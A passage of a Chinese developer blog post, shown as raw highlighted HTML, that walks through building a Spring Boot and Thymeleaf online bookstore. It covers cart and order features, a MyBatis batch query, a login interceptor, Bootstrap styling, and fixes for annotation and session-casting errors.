class="string">&quot;minus([[$&#123;cart.id&#125;]],[[$&#123;cart.newPrice&#125;]],[[$&#123;iter.index&#125;]])&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">th:id</span>=<span class="string">&quot;$&#123;&#x27;cartCount&#x27; + iter.index&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&#x27;form-control&#x27;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;cart.count&#125;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;btn btn-default&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;plus([[$&#123;cart.id&#125;]],[[$&#123;cart.newPrice&#125;]],[[$&#123;iter.index&#125;]])&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中点击左边触发minus函数，点击右边触发plus函数，中间显示当前该书的数量。minus和plus需要实现异步修改数据库的记录（根据cart.id）</p><p>这里的iter是在进行循环对象输出时定义的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr <span class="attr">th</span>:each=<span class="string">&quot;cart,iter:$&#123;cartList&#125;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>然后每次循环对应的项的id都不同，还是这张图，序号为1对应的数量3和序号为2对应的数量1是不同的，但是都是用th:each输出的，为了表示不同，使用<code>th:id=&quot;$&#123;&#39;cartCount&#39; + iter.index&#125;&quot;</code>根据循环的不同拼接出的id也不同</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230529204707259"></p><p>其中<code>$(&quot;#cartCount&quot;+index).val()</code>意思为取<code>&lt;input type=&#39;text&#39; th:id=&quot;$&#123;&#39;cartCount&#39; + iter.index&#125;&quot; class=&#39;form-control&#39; th:value=&quot;$&#123;cart.count&#125;&quot;&gt;</code>的value，也就是当前这条数据的数量。比如第一条北纬78°，<code>$(&quot;#cartCount&quot;+index)</code>就指代了id&#x3D;..这个的div，val()是取值</p><p>minus的实现:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">minus</span>(<span class="params">cartId,price,index</span>) &#123;</span><br><span class="line">    <span class="comment">//数量减一</span></span><br><span class="line">   <span class="keyword">var</span> count = <span class="built_in">parseInt</span>($(<span class="string">&quot;#cartCount&quot;</span>+index).<span class="title function_">val</span>());</span><br><span class="line">   <span class="keyword">var</span> _price = <span class="built_in">parseFloat</span>(price);</span><br><span class="line">   <span class="keyword">if</span> (count != <span class="number">1</span>)&#123;</span><br><span class="line">                 $(<span class="string">&quot;#cartCount&quot;</span>+index).<span class="title function_">val</span>(count - <span class="number">1</span>);</span><br><span class="line">                 $(<span class="string">&quot;#cartPrice&quot;</span> + index).<span class="title function_">html</span>((count - <span class="number">1</span>) * _price);</span><br><span class="line">      <span class="title function_">updateCart</span>(cartId,count - <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>页面上获取的price是以字符串形式响应的，要用parseFloat处理</p><p>updateCart:post发送cartId和count</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">updateCart</span>(<span class="params">cartId,count</span>) &#123;</span><br><span class="line">             $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">                 <span class="attr">url</span>: contextPath + <span class="string">&quot;/cart/update&quot;</span>,</span><br><span class="line">                 <span class="attr">data</span>:&#123;<span class="string">&quot;id&quot;</span>:cartId,<span class="string">&quot;count&quot;</span>:count&#125;,</span><br><span class="line">                 <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">                 <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">         $(<span class="string">&quot;#total&quot;</span>).<span class="title function_">html</span>(<span class="string">&#x27;总价&#x27;</span> + data + <span class="string">&#x27;元&#x27;</span>);</span><br><span class="line">         $(<span class="string">&quot;.cartPrice&quot;</span>).<span class="title function_">html</span>(data);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;)</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>在后端:<br>它接受一个名为”cart”的购物车对象，并将其更新到数据库中。然后，从会话中获取用户对象，并使用该用户的ID查询该用户的购物车列表。然后，计算购物车项目的总价并将其作为字符串返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/update&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">update</span><span class="params">(HttpSession session,Cart cart)</span>&#123;</span><br><span class="line">    cartService.updateById(cart);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    List&lt;CartVo&gt; cartVos = cartService.findCartByUser(user.getId());</span><br><span class="line">    <span class="comment">//用户购物车信息存放到session中</span></span><br><span class="line">    <span class="type">double</span> <span class="variable">price</span> <span class="operator">=</span> cartService.getCartItemTotal(cartVos);</span><br><span class="line">    <span class="keyword">return</span> String.valueOf(price);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按理说update中要对session及时的更新：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用户购物车信息存放到session中</span></span><br><span class="line"><span class="type">UserCartVo</span> <span class="variable">userCartVo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserCartVo</span>();</span><br><span class="line">userCartVo.setNum(cartVos.size());</span><br><span class="line">userCartVo.setTotalPrice(cartService.getCartItemTotal(cartVos));</span><br><span class="line">session.setAttribute(<span class="string">&quot;userCartInfo&quot;</span>,userCartVo);</span><br><span class="line">model.addAttribute(<span class="string">&quot;cartList&quot;</span>,cartVos);</span><br></pre></td></tr></table></figure><p>但是不更新也行，因为每次前端都从数据库读的数据，而数据库已经及时更新了。加上也行，没区别</p><p>至于购物车的删除，无异于更新，只是前端要进行根据每项checkbox的id进行移除，此处省略</p><h2 id="我的订单"><a href="#我的订单" class="headerlink" title="我的订单"></a>我的订单</h2><p>内容与我的购物车大致一致，重复的内容就不写了，主要就是实现结算商品功能</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230602202329936.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230602202329936.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230602202329936"></p><p>根据user_id和book_id查询记录</p><p>这是一个方法签名，其作用是根据传入的  <code>ids</code>  列表，返回一个  <code>CartVo</code>  类型的对象列表。 <code>@Param</code>  注解用于指定传入函数的参数名称，这里的参数名称是  <code>ids</code> 。该函数可能用于根据传入的 ID 列表查找  <code>CartVo</code>  对象列表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&#123;</span></span><br><span class="line"><span class="meta">        &quot;&lt;script&gt;&quot; +</span></span><br><span class="line"><span class="meta">                &quot;SELECT\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;\tbsc.*, bsb.NAME AS bookName, bsb.img_url AS img_url,\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;\tbsb.new_price AS new_price\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;FROM\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;\tbs_cart bsc\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;LEFT JOIN bs_book bsb ON bsc.book_id = bsb.id\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;WHERE bsc.id in\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;&lt;foreach item=&#x27;item&#x27; collection=&#x27;ids&#x27; open=&#x27;(&#x27; separator=&#x27;,&#x27; close=&#x27;)&gt;&quot; +</span></span><br><span class="line"><span class="meta">                &quot;#&#123;item&#125;&quot; +</span></span><br><span class="line"><span class="meta">                &quot;&lt;/foreach&gt;&quot; +</span></span><br><span class="line"><span class="meta">        &quot;&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line">List&lt;CartVo&gt; <span class="title function_">findCartListByIds</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> List&lt;String&gt; ids)</span>;</span><br></pre></td></tr></table></figure><blockquote><p><code>@Param</code>  注解通常用于指定方法参数的名称，以便在 MyBatis 映射器 XML 文件中引用该参数。当方法有多个参数时，该注解可以帮助 MyBatis 区分它们。此外，使用  <code>@Param</code>  注解可以使代码更加清晰易懂。</p></blockquote><p>这是一个 MyBatis 的注解  <code>@Select</code> ，用于在数据库中查询数据。在这个注解中，使用了一个 SQL 语句，该语句使用了  <code>LEFT JOIN</code>  操作符将两个表  <code>bs_cart</code>  和  <code>bs_book</code>  连接起来。查询的结果包括  <code>bs_cart</code>  表中的所有列以及  <code>bs_book</code>  表中的  <code>name</code> 、 <code>img_url</code>  和  <code>new_price</code>  列。    在 SQL 语句中使用了  <code>&lt;script&gt;</code>  标签，这是因为在 MyBatis 中，可以使用动态 SQL 语句，该标签用于将多个 SQL 语句组合在一起。在  <code>&lt;script&gt;</code>  标签中，使用了  <code>foreach</code>  标签，该标签用于循环遍历一个集合，并将集合中的每个元素插入到 SQL 语句中。在这个例子中， <code>foreach</code>  标签用于将传入的  <code>ids</code>  集合中的元素插入到 SQL 语句中的  <code>WHERE</code>  子句中。   最后，使用了  <code>#&#123;item&#125;</code>  表示每个元素的值，这个值会被 MyBatis 自动转义，以避免 SQL 注入攻击。</p><p>即mybatis提供的对列表的批量查询</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="未登录情况的拦截器识别"><a href="#未登录情况的拦截器识别" class="headerlink" title="未登录情况的拦截器识别"></a>未登录情况的拦截器识别</h3><p>springboot可以直接在interceptor下进行自定义拦截器：实现HandlerInterceptor接口，并重写preHandle()和postHandle方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PermissionInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(user != <span class="literal">null</span> &amp;&amp; user.getUsername() != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            response.sendRedirect(request.getContextPath() + <span class="string">&quot;/book/index&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其注入到WebMvcConfig下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span>&#123;</span><br><span class="line">    registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">PermissionInterceptor</span>()).addPathPatterns(<span class="string">&quot;/order/**&quot;</span>,<span class="string">&quot;/cart/**&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="美化部分"><a href="#美化部分" class="headerlink" title="美化部分"></a>美化部分</h2><ul><li>翻页部分：</li></ul><p>bootstrap在li标签上可以使用classappend&#x3D;’disabled’使按钮消失，比如已经翻到第一页，就应该没有上一页的按钮，更人性化</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">th:classappend</span>=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;disabled&#x27; : &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:style</span>=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;pointer-events:none&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData($&#123;pre&#125;,$&#123;category&#125;)|&quot;</span>&gt;</span><span class="symbol">&amp;larr;</span>上一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下一页类似</p><p>图书与上下页按钮居中，用div标签的<code>class=&quot;container&quot;</code>即可控制</p><p>（前端的调试在F12选中改要快很多）</p><ul><li>分页的翻页按钮：</li></ul><p>这里对前端的翻页代码做下解释，在bookListData中：</p><p>如果页数的图标等于当前页，则高亮，顺便each遍历也按页数把图标做了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">th:each</span>=<span class="string">&quot;i:$&#123;#numbers.sequence(1,pages)&#125;&quot;</span> <span class="attr">th:class</span>=<span class="string">&quot;$&#123;cur == i&#125; ? &#x27;active&#x27; : &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;i&#125;&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;loadData([[$&#123;i&#125;]],[[$&#123;pageSize&#125;]],[[$&#123;category&#125;]])&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>达到这个效果：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521215052494.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521215052494.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230521215052494"></p><ul><li>注册用户名是否存在部分：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#msg&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="number">102</span>) &#123;<span class="comment">//用户存在</span></span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;用户名不合法&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;alert-success&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">addClass</span>(<span class="string">&quot;alert-danger&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;用户名可以注册&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;alert-danger&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">addClass</span>(<span class="string">&quot;alert-success&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>在函数中：</p><ol><li><p><code>$(&quot;#msg&quot;).css(&quot;display&quot;,&quot;block&quot;);</code> 设置 id 为 “msg” 的元素的 display 样式为 “block”，用于显示一个提示消息。</p></li><li><p><code>if (data == 102) &#123;</code> 判断返回的数据是否等于 102，如果是，则表示用户已存在，此时页面上会显示 “用户名不合法” 的提示信息，并将提示框的样式从 alert-success 改为 alert-danger。</p></li><li><p><code>$(&quot;#tip&quot;).html(&quot;用户名可以注册&quot;);</code> 如果返回数据不等于 102，则表示用户名可以注册，此时将提示信息改为 “用户名可以注册”，并将提示框的样式从 alert-danger 改为 alert-success。</p></li></ol><p>其中，#msg 和 #tip 都是网页中的元素，分别用于显示消息和提示框。</p><p>这样就可以实现”用户名可以使用“是绿标签，”用户名已使用“是红标签</p><ul><li>轮播部分</li></ul><p>轮播直接用的bootstrap实现</p><p><code>class=&quot;carousel-control left&quot;</code>：这个元素具有两个类名，分别是 <code>carousel-control</code> 和 <code>left</code>。 <code>carousel-control</code> 是一个 Bootstrap 的类名，它告诉浏览器将这个元素作为轮播组件的控件来呈现。 <code>left</code> 类名指示该元素将定位到轮播组件的左侧。<br>- <code>href=&quot;#myCarousel&quot;</code>：<code>href</code> 属性指定了链接，当用户单击这个元素时，会自动跳转到指定的链接。在这种情况下，链接是一个 ID 为 <code>myCarousel</code> 的元素，它是轮播组件的主要容器。<br>- <code>data-slide=&quot;prev&quot;</code>：这个属性告诉轮播组件当用户单击该元素时向前滑动一张幻灯片。 <code>data-slide</code> 是一个 Bootstrap 属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;carousel-control left&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#myCarousel&quot;</span> <span class="attr">data-slide</span>=<span class="string">&quot;prev&quot;</span>&gt;</span><span class="symbol">&amp;lsaquo;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页底也是bootstrap写的</p><ul><li>注册部分：</li></ul><p><code>$(&quot;#register&quot;).modal(&#39;hide&#39;);</code>注册成功后把注册的模态框隐藏</p><ul><li>价格部分：</li></ul><p>原价用<code>style=&quot;text-decoration: line-through;&quot;</code>做划线处理</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522172953079.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522172953079.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230522172953079"></p><p>* </p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>刚开始我的bookservice忘添加@Autowired注解了，到处出现如下报错：</p><p><code>Servlet.service() for servlet [dispatcherServlet] in context with path [/book] threw exception</code></p><blockquote><p>@Autowired可以标注在属性上、方法上和构造器上，来完成自动装配。默认是根据属性类型，spring自动将匹配到的属性值进行注入，然后就可以使用这个属性（对Springboot02WebApplicationTests类来说）autoWiredBean对象的方法。<br>怎么用？<br>它可以标注在属性上、方法上和构造器上，那有什么区别吗？简单来说因为类成员的初始化顺序不同，静态成员 ——&gt; 变量初始化为默认值——&gt;构造器——&gt;为变量赋值。如果标注在属性上，则在构造器中就不能使用这个属性（对象）的属性和方法。<br><strong>当标注的属性是接口时，其实注入的是这个接口的实现类</strong>， 如果这个接口有多个实现类，只使用@Autowired就会报错</p></blockquote><p>根据如下文档，可知service的实例变量，也就是需要使用到bean的场景需要autowired</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> BookService bookService;</span><br></pre></td></tr></table></figure><blockquote><p><code>@Autowired</code> 注解用于进行自动装配依赖关系，通常应该在需要使用某个Bean的时候使用该注解。例如，在Service类中需要用到某个DAO类的实例时，可以在Service类的实例变量上使用 <code>@Autowired</code> 注解，Spring框架会自动查找并注入该实例的依赖关系。此外， <code>@Autowired</code> 注解通常应该与其他注解（例如 <code>@Service</code> 、 <code>@Component</code> 等）一起使用，以使Spring能够自动扫描和装配应用程序中的Bean。</p></blockquote><blockquote><p>没有@Autowired，不会自动注入，声明自定义的service或mapper然后使用时一定要自动注入！</p></blockquote><ul><li>第二个问题：我的BookMapper没有加@Mapper注解没有报错，但是UserMapper没有加@Mapper注解时，用@Autowired进行userMapper声明时会报错</li></ul><p>问题就出在Book的实现是在Controller对bookService进行使用，并没有用到声明Mapper，也就不需要Mapper的bean。但是User功能的实现我是写在UserService里的，需要直接用到userMapper</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514205615147.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514205615147.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514205615147"></p><p>就此看来是否注入的规则很简单，一般来说这些都应该注入，又或是要autowired自动装配一个接口，就需要在上一步对其注解</p><ul><li>第三个问题：由于我的前端是直接用的bootstrap做的轮播图，在想调整轮播图大小的时候，直接对bootstrap.css修改不起作用，在F12的开发者box里看到，代码依旧是bootstrap.min.css的代码</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518093604125.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518093604125.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230518093604125"></p><p>这里我的处理方式是在box里把数据改了，然后保存到本地把原bootstrap.min.css覆盖，虽然比较麻烦，但是有效果</p><p>但是在img里设置用<code>object-fit:cover</code>始终不能填满box，后来终于在查看器里发现index.css里对图片又重新做了定义gcarouse img，把其对应的长宽，取消打勾，对应在轮播的图片长宽就起作用了</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518103241451.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518103241451.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230518103241451"></p><p>这个错误对我来说影响深远，因为学到了所见即所得的查看器调试css样式</p><ul><li>在控制翻到第一页和最后一页时，不能仅仅对样式设class:disabled只能禁掉样式，还要令style的<code>pointer-events:none</code>，不然只是样式变了，还能实现翻页功能，就翻到了空页</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">th</span>:style=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;pointer-events:none&#x27; : &#x27;&#x27;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>未解决：还是这个功能，多按几次首页和尾页，就失去翻页功能了，到现在不知道为什么</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521225945903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521225945903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230521225945903"></p><ul><li>添加购物车部分</li></ul><p>添加购物车是用户个人信息，需要用到session来存储信息，而这么些是错的（User是自定义的连接数据库的实体类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure><p>而应该这么写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure><p>因为session.getAttribute()是 object对象，需要强制转换为User对象</p><ul><li>ResponseBody注解的使用：</li></ul><p>​如果不使用  <code>@ResponseBody</code>  注解，控制器方法返回的数据将被框架放入模型（Model）或直接写入响应流，</p><p>​如果返回类型是 String，它将被当作视图的名称进行解析，如果返回类型是 void，则视图名称将从请求路径（Request URI）中推断出来。  </p><p>如果返回值是对象，则框架会像下面这样处理该对象：   </p><ul><li><ul><li><p>将对象放入模型（Model）中，模型的 key默认为对象的类名（首字母小写），可以通过  <code>@ModelAttribute</code>  注解指定其他的 key。模型可以在 JSP、Thymeleaf、Freemarker、Velocity、Mustache 等各种视图模板中使用。 </p></li><li><p>如果控制器方法返回类型为  <code>String</code> ，将其解释为视图的名称，并使用视图解析器（ViewResolver）查找相应的视图，并使用模型中的数据渲染视图。  </p></li><li><p>如果控制器方法返回  <code>void</code> ，则视图名称将从请求路径中推断出来，使用相应的视图解析器（ViewResolver）查找视图，并使用模型中的数据渲染视图。</p></li></ul><p>  下面是不使用  <code>@ResponseBody</code>  注解的示例：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, Model model)</span> &#123;</span><br><span class="line">        <span 